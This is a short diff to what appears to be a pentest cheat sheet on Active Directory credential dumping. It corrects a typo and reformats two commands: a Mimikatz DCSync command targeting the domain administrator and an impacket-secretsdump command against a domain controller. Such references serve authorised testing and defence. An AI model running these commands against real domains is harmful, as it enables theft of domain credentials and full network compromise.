@@ -6,8 +6,8 @@
 
 #### 1) Mimikatz
 
- - mimikatz lsadump::dcsync /domain:TARGET_DOMIAN /user:TARGET_DOMAIN\administrator
+    mimikatz lsadump::dcsync /domain:TARGET_DOMAIN /user:TARGET_DOMAIN\administrator
 
 #### 2) secretsdump
 
- - impacket-secretsdump 'DOMAIN'/'USER':'PASSWORD'@'DOMAIN_CONTROLLER'
+    impacket-secretsdump 'DOMAIN'/'USER':'PASSWORD'@'DOMAIN_CONTROLLER'
